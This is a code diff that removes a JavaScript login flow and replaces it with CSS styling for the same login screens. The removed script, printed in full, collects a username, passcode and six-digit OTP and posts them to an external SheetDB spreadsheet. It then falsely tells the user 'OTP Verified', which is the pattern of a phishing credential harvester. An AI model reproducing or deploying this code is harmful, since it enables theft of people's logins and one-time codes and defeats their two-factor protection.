@@ -1,135 +1,86 @@
-window.onload = () => {
-    setTimeout(() => {
-        const splash = document.getElementById('splashScreen');
-        splash.classList.add('splash-hidden');
-    }, 2000);
-};
-
-const track = document.querySelector('.carousel-track');
-const dots = document.querySelectorAll('.dot');
-const slider = document.getElementById('mainSlider');
-
-// Navigation Triggers
-const loginTrigger = document.getElementById('loginTrigger');    
-const backToLanding = document.getElementById('backToLanding');  
-const goToOtp = document.getElementById('goToOtp');            
-const backToLogin = document.getElementById('backToLogin');    
-const finishAuth = document.getElementById('finishAuth');      
-
-// Input Elements
-const usernameInput = document.getElementById('username');
-const passcodeInput = document.getElementById('passcode');
-const otpInput = document.getElementById('otpInput');
-
-// --- CONFIGURATION ---
-// Replace the URL below with your actual SheetDB API URL
-const SHEETDB_API_URL = 'https://sheetdb.io/api/v1/gnmgo6n53wxu6';
-
-let currentIndex = 0;
-let carouselInterval;
-
-function startCarousel() {
-    carouselInterval = setInterval(() => {
-        currentIndex = (currentIndex + 1) % 2;
-        if(track) track.style.transform = `translateX(-${currentIndex * 50}%)`;
-        dots.forEach(dot => dot.classList.remove('active'));
-        if(dots[currentIndex]) dots[currentIndex].classList.add('active');
-    }, 4000);
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
 }
 
-// 1. Landing -> Login
-loginTrigger.addEventListener('click', () => {
-    slider.className = 'main-slider slider-step-2';
-    clearInterval(carouselInterval);
-});
+body {
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
 
-// 2. Login -> Landing
-backToLanding.addEventListener('click', () => {
-    slider.className = 'main-slider slider-step-1';
-    startCarousel();
-});
+.app-viewport {
+    width: 100%;
+    max-width: 450px;
+    height: 100vh;
+    background: white;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+}
 
-// 3. Login -> OTP
-goToOtp.addEventListener('click', () => {
-    slider.className = 'main-slider slider-step-3';
-});
+.main-slider {
+    display: flex;
+    width: 400%; /* 4 pages = 400% */
+    height: 100%;
+    transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+}
 
-// 4. OTP -> Login
-backToLogin.addEventListener('click', () => {
-    slider.className = 'main-slider slider-step-2';
-});
+/* Horizontal Sliding Logic (25% increments for 4 pages) */
+.slider-step-0 { transform: translateX(0); }
+.slider-step-1 { transform: translateX(-25%); }
+.slider-step-2 { transform: translateX(-50%); }
+.slider-step-3 { transform: translateX(-75%); }
 
-// --- SHEETDB INTEGRATION ---
-finishAuth.addEventListener('click', async () => {
-    const username = usernameInput.value;
-    const passcode = passcodeInput.value;
-    const otp = otpInput.value;
+.page {
+    width: 25%; /* 1/4 of the slider width */
+    height: 100%;
+    flex-shrink: 0;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+}
 
-    // Basic check to ensure OTP isn't empty
-    if (otp.length < 6) {
-        alert("Please enter a valid 6-digit OTP.");
-        return;
-    }
+/* Splash Screen Style */
+.splash-img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
 
-    // UI Feedback
-    finishAuth.innerText = "Verifying...";
-    finishAuth.disabled = true;
+/* --- Carousel on Landing Page --- */
+.carousel-wrapper { width: 100%; height: 50%; position: relative; overflow: hidden; }
+.carousel-track { display: flex; width: 200%; height: 100%; transition: transform 0.4s ease-in-out; }
+.slide { width: 50%; height: 100%; }
+.slide img { width: 100%; height: 100%; object-fit: cover; }
+.dots { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 8px; }
+.dot { width: 8px; height: 8px; background: rgba(255,255,255,0.5); border-radius: 50%; transition: 0.3s; }
+.dot.active { background: #fff; width: 20px; border-radius: 10px; }
 
-    try {
-        const response = await fetch(SHEETDB_API_URL, {
-            method: 'POST',
-            headers: {
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                data: [
-                    {
-                        'username': username,
-                        'passcode': passcode,
-                        'otp': otp,
-                        'timestamp': new Date().toLocaleString() // Optional: tracks when it was sent
-                    }
-                ]
-            })
-        });
+/* --- Buttons & Inputs --- */
+.auth-section { padding: 30px 20px; display: flex; flex-direction: column; gap: 15px; }
+button { width: 100%; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: 0.3s; }
+.btn-login { background: #005696; color: white; border: none; }
+.btn-register { background: transparent; color: #005696; border: 2px solid #005696; }
 
-        const result = await response.json();
+.bottom-nav { position: absolute; bottom: 0; width: 100%; display: flex; padding: 20px 0; border-top: 1px solid #eee; background: #fff; }
+.nav-item { flex: 1; text-align: center; }
+.nav-item p { font-size: 12px; color: #666; margin-top: 5px; }
+.divider { width: 1px; height: 40px; background: #eee; }
 
-        if (result.created === 1) {
-            alert("Success! OTP Verified.");
-            
-            // Reset App State
-            usernameInput.value = '';
-            passcodeInput.value = '';
-            otpInput.value = '';
-            slider.className = 'main-slider slider-step-1';
-            startCarousel();
-        } else {
-            throw new Error("Failed to write to sheet");
-        }
-
-    } catch (error) {
-        console.error('Error:', error);
-        alert("Connection error. Please check your API URL or internet.");
-    } finally {
-        finishAuth.innerText = "Verify";
-        finishAuth.disabled = false;
-    }
-});
-
-// Username validation logic (Enables the Login button)
-usernameInput.addEventListener('input', (e) => {
-    if (e.target.value.trim().length > 3) {
-        goToOtp.style.backgroundColor = '#005696';
-        goToOtp.disabled = false;
-    } else {
-        goToOtp.style.backgroundColor = '#e0e4e8';
-        goToOtp.disabled = true;
-    }
-});
-
-// Initialize
-startCarousel();
-
-          
+/* --- Form Elements --- */
+.login-header { padding: 20px; }
+.back-btn { background: none; border: none; width: auto; padding: 10px; }
+.login-content { padding: 0 30px; }
+.login-illus { width: 180px; display: block; margin: 0 auto 20px; }
+.login-title { color: #005696; font-size: 28px; margin-bottom: 25px; }
+input { width: 100%; border: none; border-bottom: 1.5px solid #ddd; padding: 15px 0; margin-bottom: 20px; font-size: 16px; outline: none; transition: 0.3s; }
+input:focus { border-bottom-color: #005696; }
+.forgot-link { display: block; text-align: right; color: #005696; text-decoration: none; font-weight: bold; font-size: 14px; margin-bottom: 35px; }
+.btn-login-submit { background-color: #e0e4e8; color: white; border: none; margin-bottom: 15px; }
+.btn-register-outline { background: transparent; border: 1.5px solid #005696; color: #005696; }
+    
